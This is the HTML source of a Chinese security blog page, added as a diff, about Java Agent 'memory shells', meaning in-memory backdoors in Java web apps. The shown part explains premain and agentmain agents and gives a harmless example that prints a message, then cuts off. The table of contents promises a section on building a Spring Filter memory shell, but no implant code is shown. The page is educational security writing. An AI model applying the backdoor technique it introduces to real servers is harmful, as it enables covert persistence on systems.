@@ -1,0 +1,609 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
+  Java 内存马之 Java Agent 内存马
+  #
+
+
+  什么是 Java Agent
+  #
+
+Java 是一种静态强类型语言，在运行之前必须先编译成.class字节码，然后再交给 JVM 处理运行。Java Agent 就是一种能在不影响正常编译的前提下，修改 Java 字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。
+实际上，一些常见的技术比如热部署、诊断工具等都是基于 Java Agent 技术来实现的。那么 Java Agent 技术具体是怎么实现的？
+对于 Agent（代理）来说，大致可以分为两种，一种是在 JVM 启动前加载的premain-Agent，另一种是 JVM 启动后加载的agentmain-Agent。这里我们可以将其理解为一种特殊的拦截器。
+premain-Agent
+
+agentmain-Agent
+
+
+  几种 Java Agent 实例
+  #
+
+
+  premain-Agent
+  #
+
+从官方文档中可以知道，首先我们必须实现premain()方法，同时我们 jar 文件的清单（manifest）中必须要含有Premain-Class属性。
+我们可以在命令行利用-javaagent来实现启动时加载。
+
+premain()方法顾名思义，会在我们运行main()方法之前进行调用，即在运行main()方法之前会去调用我们 jar 包中Premain-Class类中的premain()方法。
+我们先来实现一个简单的premain-Agent：
+package com.premain.agent;
+
+import java.lang.instrument.Instrumentation;
+
+public class JavaAgentPremain {
+    public static void premain(String args, Instrumentation inst){
+        for (int i = 0; i < 10; i++) {
+            System.out.println("调用了 premain agent");
+        }
+    }
+}
+然后在resources/META-INF/下创建agent.MF清单文件用来指定premain-Agent的启动类：'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bjava-agent%E5%86%85%E5%AD%98%E9%A9%AC/"><meta property="og:site_name" content="Solowalker"><meta property="og:title" content="Java 内存马之 Java Agent 内存马"><meta property="og:description" content='Java 内存马之 Java Agent 内存马 # 什么是 Java Agent # Java 是一种静态强类型语言，在运行之前必须先编译成.class字节码，然后再交给 JVM 处理运行。Java Agent 就是一种能在不影响正常编译的前提下，修改 Java 字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。
+实际上，一些常见的技术比如热部署、诊断工具等都是基于 Java Agent 技术来实现的。那么 Java Agent 技术具体是怎么实现的？
+对于 Agent（代理）来说，大致可以分为两种，一种是在 JVM 启动前加载的premain-Agent，另一种是 JVM 启动后加载的agentmain-Agent。这里我们可以将其理解为一种特殊的拦截器。
+premain-Agent
+agentmain-Agent
+几种 Java Agent 实例 # premain-Agent # 从官方文档中可以知道，首先我们必须实现premain()方法，同时我们 jar 文件的清单（manifest）中必须要含有Premain-Class属性。
+我们可以在命令行利用-javaagent来实现启动时加载。
+premain()方法顾名思义，会在我们运行main()方法之前进行调用，即在运行main()方法之前会去调用我们 jar 包中Premain-Class类中的premain()方法。
+我们先来实现一个简单的premain-Agent：
+package com.premain.agent; import java.lang.instrument.Instrumentation; public class JavaAgentPremain { public static void premain(String args, Instrumentation inst){ for (int i = 0; i < 10; i++) { System.out.println("调用了 premain agent"); } } } 然后在resources/META-INF/下创建agent.MF清单文件用来指定premain-Agent的启动类：'><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-10-22T00:00:00+00:00"><meta property="article:modified_time" content="2026-10-22T00:00:00+00:00"><title>Java 内存马之 Java Agent 内存马 | Solowalker</title><link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://s0lowalker.github.io/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bjava-agent%E5%86%85%E5%AD%98%E9%A9%AC/><link rel=stylesheet href=/book.min.bef206ca73466d23b093d88913fd40ccba55f422e1e51ed680a9e04a58cdc341.css integrity="sha256-vvIGynNGbSOwk9iJE/1AzLpV9CLh5R7WgKngSljNw0E=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.d71b89e6b15137012f7361998e2a0988e6a3304e49803493146f4813fd259183.js integrity="sha256-1xuJ5rFRNwEvc2GZjioJiOajME5JgDSTFG9IE/0lkYM=" crossorigin=anonymous></script></head><body dir=ltr><header class=top-header><div class=top-header-inner><div class=top-header-left><img src=/images/logo/solowalker.png alt=Logo class=top-header-logo>
+<a href=https://s0lowalker.github.io/ class=top-header-title>Solowalker</a></div><div class=top-header-right><a href=/friends>友链</a>
+<a href=https://github.com/s0lowalker target=_blank rel=noopener>GitHub</a></div></div></header><input type=checkbox class="hidden toggle" id=menu-control>
+<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/images/logo/solowalker.png alt=Logo class=book-icon><span>Solowalker</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><input type=checkbox id=section-5727aa49b051f298f64d3a0dfcdaac79 class=toggle checked>
+<label for=section-5727aa49b051f298f64d3a0dfcdaac79 class="flex justify-between"><a role=button>Java安全</a></label><ul><li><input type=checkbox id=section-f3baf843ac4871d7cc6c9747f091d4ee class=toggle checked>
+<label for=section-f3baf843ac4871d7cc6c9747f091d4ee class="flex justify-between"><a role=button>Java攻防</a></label><ul><li><input type=checkbox id=section-94cb9c321d608771dba7d61d7bff1f9f class=toggle checked>
+<label for=section-94cb9c321d608771dba7d61d7bff1f9f class="flex justify-between"><a role=button>内存马篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bservlet%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马之 Servlet 型内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bjava-agent%E5%86%85%E5%AD%98%E9%A9%AC/ class=active>Java 内存马之 Java Agent 内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bvalve%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马之 Valve 型内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Blistener%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马之 Listener 型内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8Bfilter%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/>Java 内存马之 Filter 型内存马</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8B%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%8B%E7%BB%8D/>Java 内存马之内存马介绍</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/%E5%86%85%E5%AD%98%E9%A9%AC%E7%AF%87/java%E5%86%85%E5%AD%98%E9%A9%AC%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%AF%87/>Java 内存马之基础篇</a></li></ul></li><li><input type=checkbox id=section-40df731824a253d5840b20b53d52c2ba class=toggle>
+<label for=section-40df731824a253d5840b20b53d52c2ba class="flex justify-between"><a role=button>EL表达式</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/el%E8%A1%A8%E8%BE%BE%E5%BC%8F/el-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/>EL 表达式注入</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/el%E8%A1%A8%E8%BE%BE%E5%BC%8F/spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/>SpEL表达式注入</a></li></ul></li><li><input type=checkbox id=section-f40d137f7e26fb2fcb23fda5a456c204 class=toggle>
+<label for=section-f40d137f7e26fb2fcb23fda5a456c204 class="flex justify-between"><a role=button>Weblogic篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0ssrf/>Weblogic 弱口令&文件上传&amp;SSRF</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-jndi-%E6%B3%A8%E5%85%A5/>Weblogic JNDI 注入</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-t3-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>Weblogic T3 反序列化分析</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/weblogic%E7%AF%87/weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/>Weblogic XMLDecoder反序列化</a></li></ul></li><li><input type=checkbox id=section-f4bd766ffc2c2c4a5fca527ebb421aba class=toggle>
+<label for=section-f4bd766ffc2c2c4a5fca527ebb421aba class="flex justify-between"><a role=button>Log4j2篇</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/log4j2%E7%AF%87/log4shell/>Log4shell</a></li></ul></li><li><input type=checkbox id=section-ed10ff85653d7364765d5831a959b09b class=toggle>
+<label for=section-ed10ff85653d7364765d5831a959b09b class="flex justify-between"><a role=button>Fastjson反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.62-1.2.68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/>Fastjson1.2.62-1.2.68反序列化漏洞</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%90%84%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/>Fasjson各版本绕过</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson1.2.24%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>Fastjson1.2.24漏洞分析</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%9F%BA%E7%A1%80/>Fastjson基础</a></li></ul></li><li><input type=checkbox id=section-5c8ca639d1baf5e5418b2e7f2608a8f1 class=toggle>
+<label for=section-5c8ca639d1baf5e5418b2e7f2608a8f1 class="flex justify-between"><a role=button>Shiro反序列化</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro721/>Shiro721</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/shiro550/>Shiro550</a></li></ul></li><li><input type=checkbox id=section-db4f1366364f6e3bdeccbe9d6728217c class=toggle>
+<label for=section-db4f1366364f6e3bdeccbe9d6728217c class="flex justify-between"><a role=button>Java反序列化之CC链</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc11/>java反序列化之CC11</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcb/>java反序列化之CB</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc7/>java反序列化之CC7</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc5/>java反序列化之CC5</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc2/>java反序列化之CC2</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc4/>java反序列化之CC4</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc3/>java反序列化之CC3</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc6/>java反序列化之CC6</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc1/>Java反序列化之CC1</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcc%E9%93%BE/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Burldns%E9%93%BE/>java反序列化之URLDNS链</a></li></ul></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E6%94%BB%E9%98%B2/java%E5%B8%B8%E8%A7%84%E6%BC%8F%E6%B4%9E/>Java常规漏洞</a></li></ul></li><li><input type=checkbox id=section-1dc6eb9f6244b6f677832d892b22dc02 class=toggle>
+<label for=section-1dc6eb9f6244b6f677832d892b22dc02 class="flex justify-between"><a role=button>Java基础</a></label><ul><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/23%E7%A7%8D%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/>23种设计模式</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/spring%E5%BC%80%E5%8F%91/>Spring开发</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jndi/>JNDI</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/jdk%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/>JDK动态代理</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java-io%E6%B5%81/>Java IO流</a></li><li><a href=/docs/java%E5%AE%89%E5%85%A8/java%E5%9F%BA%E7%A1%80/java%E5%8A%A8%E6%80%81%E7%B1%BB%E5%8A%A0%E8%BD%BD/>java类的动态加载</a></li></ul></li></ul></li><li><input type=checkbox id=section-044b235faa94474d25fd6dc85c615699 class=toggle>
+<label for=section-044b235faa94474d25fd6dc85c615699 class="flex justify-between"><a role=button>RASP</a></label><ul><li><a href=/docs/rasp/rasp%E5%BC%80%E5%8F%913%E5%A4%84%E7%90%86%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E8%AF%B7%E6%B1%82/>RASP开发(3)——处理一次真实请求</a></li><li><a href=/docs/rasp/rasp%E5%BC%80%E5%8F%912%E5%AE%9E%E7%8E%B0%E5%9F%BA%E6%9C%AC%E6%8B%A6%E6%88%AA/>RASP(2)——实现基本拦截</a></li><li><a href=/docs/rasp/rasp%E5%BC%80%E5%8F%911%E7%AC%AC%E4%B8%80%E4%B8%AA%E8%B7%91%E9%80%9A%E7%9A%84javaagent/>RASP开发(1)——第一个跑通的 Java Agent</a></li><li><a href=/docs/rasp/rasp%E5%9F%BA%E7%A1%80/>RASP基础</a></li></ul></li><li><input type=checkbox id=section-473ae1b025d727335a742474995ef6ce class=toggle>
+<label for=section-473ae1b025d727335a742474995ef6ce class="flex justify-between"><a role=button>AI安全</a></label><ul><li><input type=checkbox id=section-9713cf08d8b6b4f6fb6546222f41975d class=toggle>
+<label for=section-9713cf08d8b6b4f6fb6546222f41975d class="flex justify-between"><a role=button>简介</a></label><ul><li><a href=/docs/ai%E5%AE%89%E5%85%A8/%E7%AE%80%E4%BB%8B/llm-%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8/>LLM 应用安全</a></li><li><a href=/docs/ai%E5%AE%89%E5%85%A8/%E7%AE%80%E4%BB%8B/%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E4%B8%8E%E6%A8%A1%E5%9E%8B%E5%AE%89%E5%85%A8/>对抗样本与模型安全</a></li><li><a href=/docs/ai%E5%AE%89%E5%85%A8/%E7%AE%80%E4%BB%8B/%E6%8F%90%E7%A4%BA%E8%AF%8D%E6%B3%A8%E5%85%A5/>提示词注入</a></li><li><a href=/docs/ai%E5%AE%89%E5%85%A8/%E7%AE%80%E4%BB%8B/%E8%B6%8A%E7%8B%B1/>越狱</a></li></ul></li></ul></li><li><input type=checkbox id=section-c4d784444933fdccb12cc39e2ab0a411 class=toggle>
+<label for=section-c4d784444933fdccb12cc39e2ab0a411 class="flex justify-between"><a role=button>渗透测试</a></label><ul><li><input type=checkbox id=section-42c6aa109fe86285746031b39529fd8c class=toggle>
+<label for=section-42c6aa109fe86285746031b39529fd8c class="flex justify-between"><a role=button>web开发篇</a></label><ul><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%BC%80%E5%8F%91%E7%AF%87/javaee/>JavaEE</a></li><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/web%E5%BC%80%E5%8F%91%E7%AF%87/js%E5%BA%94%E7%94%A8/>JS应用</a></li></ul></li><li><input type=checkbox id=section-6f168133498c5817b23bc8b547002dba class=toggle>
+<label for=section-6f168133498c5817b23bc8b547002dba class="flex justify-between"><a role=button>基础入门篇</a></label><ul><li><a href=/docs/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%AF%87/web%E4%B8%8Eapp%E4%B8%8E%E5%B0%8F%E7%A8%8B%E5%BA%8F/>Web、APP与小程序架构基础</a></li></ul></li></ul></li><li><input type=checkbox id=section-326ea580ca38728d53e273bd1a79dd29 class=toggle>
+<label for=section-326ea580ca38728d53e273bd1a79dd29 class="flex justify-between"><a role=button>Nodejs安全</a></label><ul><li><a href=/docs/nodejs%E5%AE%89%E5%85%A8/node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%92%8C%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/>Node.js原型链污染和沙箱逃逸漏洞学习笔记</a></li></ul></li><li><input type=checkbox id=section-d8d720db18be1ec4b3cb1ef74548db97 class=toggle>
+<label for=section-d8d720db18be1ec4b3cb1ef74548db97 class="flex justify-between"><a role=button>Web安全</a></label><ul><li><input type=checkbox id=section-31e4da0a6a404b93aaf2d9c04b32c84b class=toggle>
+<label for=section-31e4da0a6a404b93aaf2d9c04b32c84b class="flex justify-between"><a role=button>SQL注入</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/sqlite%E4%B8%8B%E7%9A%84sql%E6%B3%A8%E5%85%A5/>SQLite下的SQL注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/sql%E6%B3%A8%E5%85%A5/%E5%88%A9%E7%94%A8handler%E8%BF%9B%E8%A1%8C%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/>堆叠注入之利用handler语句获取数据</a></li></ul></li><li><input type=checkbox id=section-2885e3a564b8fe445048e1de37bef089 class=toggle>
+<label for=section-2885e3a564b8fe445048e1de37bef089 class="flex justify-between"><a role=button>SSTI</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/>Jinja2常见关键字被ban后的SSTI</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/twig%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之twig</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/>SSTI之Tornado</a></li></ul></li><li><input type=checkbox id=section-172f63492c2abb7577d01d4bf0de9853 class=toggle>
+<label for=section-172f63492c2abb7577d01d4bf0de9853 class="flex justify-between"><a role=button>文件上传</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E4%B8%8D%E5%90%ABphp%E4%BB%A3%E7%A0%81%E7%9A%84php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce/>PHP文件上传不含PHP代码实现RCE的方法</a></li></ul></li><li><input type=checkbox id=section-958f36f10c11df5112dde6c43a89cde5 class=toggle>
+<label for=section-958f36f10c11df5112dde6c43a89cde5 class="flex justify-between"><a role=button>XXE</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/xxe/apache_tika_xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/>Apache Tika XXE漏洞(CVE-2025-66516)</a></li></ul></li><li><input type=checkbox id=section-db3c5efb4a73093a1b77095b857638ed class=toggle>
+<label for=section-db3c5efb4a73093a1b77095b857638ed class="flex justify-between"><a role=button>代码审计</a></label><ul><li><input type=checkbox id=section-2641018cca6e6013f05f7d61b80b4d11 class=toggle>
+<label for=section-2641018cca6e6013f05f7d61b80b4d11 class="flex justify-between"><a role=button>DVWA审计篇</a></label><ul><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/>DVWA代码审计之命令注入</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81/>DVWA代码审计之不安全的验证码</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/>DVWA代码审计之暴力破解</a></li><li><a href=/docs/web%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/dvwa%E5%AE%A1%E8%AE%A1%E7%AF%87/dvwa%E5%AD%A6%E4%B9%A0%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/>DVWA代码审计之SQL注入</a></li></ul></li></ul></li></ul></li><li><input type=checkbox id=section-87a84385a267f81ae181c29190fbccaf class=toggle>
+<label for=section-87a84385a267f81ae181c29190fbccaf class="flex justify-between"><a role=button>数据库</a></label><ul><li><a href=/docs/%E6%95%B0%E6%8D%AE%E5%BA%93/%E6%95%B0%E6%8D%AE%E5%BA%93/>MySQL数据库盲区补充</a></li></ul></li><li><a href=/docs/%E5%8F%8D%E5%BC%B9shell/>反弹shell</a></li><li><a href=/docs/phpmyadmin%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABcve-2018-12613/>phpMyAdmin文件包含漏洞(CVE-2018-12613)</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Java 内存马之 Java Agent 内存马</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#什么是-java-agent>什么是 Java Agent</a></li><li><a href=#几种-java-agent-实例>几种 Java Agent 实例</a><ul><li><a href=#premain-agent>premain-Agent</a></li><li><a href=#agentmain-agent>agentmain-Agent</a></li><li><a href=#动态修改字节码>动态修改字节码</a></li><li><a href=#instrumentation-的局限性>Instrumentation 的局限性</a></li></ul></li><li><a href=#agent-内存马>Agent 内存马</a><ul><li><a href=#java-agent-实现-spring-filter-内存马>Java Agent 实现 Spring Filter 内存马</a></li></ul></li><li><a href=#总结>总结</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=java-内存马之-java-agent-内存马>Java 内存马之 Java Agent 内存马
+<a class=anchor href=#java-%e5%86%85%e5%ad%98%e9%a9%ac%e4%b9%8b-java-agent-%e5%86%85%e5%ad%98%e9%a9%ac>#</a></h1><h2 id=什么是-java-agent>什么是 Java Agent
+<a class=anchor href=#%e4%bb%80%e4%b9%88%e6%98%af-java-agent>#</a></h2><p>Java 是一种静态强类型语言，在运行之前必须先编译成<code>.class</code>字节码，然后再交给 JVM 处理运行。Java Agent 就是一种能在不影响正常编译的前提下，修改 Java 字节码，进而动态地修改已加载或未加载的类、属性和方法的技术。</p><p>实际上，一些常见的技术比如热部署、诊断工具等都是基于 Java Agent 技术来实现的。那么 Java Agent 技术具体是怎么实现的？</p><p>对于 Agent（代理）来说，大致可以分为两种，一种是在 JVM 启动前加载的<code>premain-Agent</code>，另一种是 JVM 启动后加载的<code>agentmain-Agent</code>。这里我们可以将其理解为一种特殊的拦截器。</p><p><strong>premain-Agent</strong></p><p><img src=https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/PreAgent.png alt></p><p><strong>agentmain-Agent</strong></p><p><img src=https://drun1baby.top/2023/12/07/Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/agentmain-Agent.png alt></p><h2 id=几种-java-agent-实例>几种 Java Agent 实例
+<a class=anchor href=#%e5%87%a0%e7%a7%8d-java-agent-%e5%ae%9e%e4%be%8b>#</a></h2><h3 id=premain-agent>premain-Agent
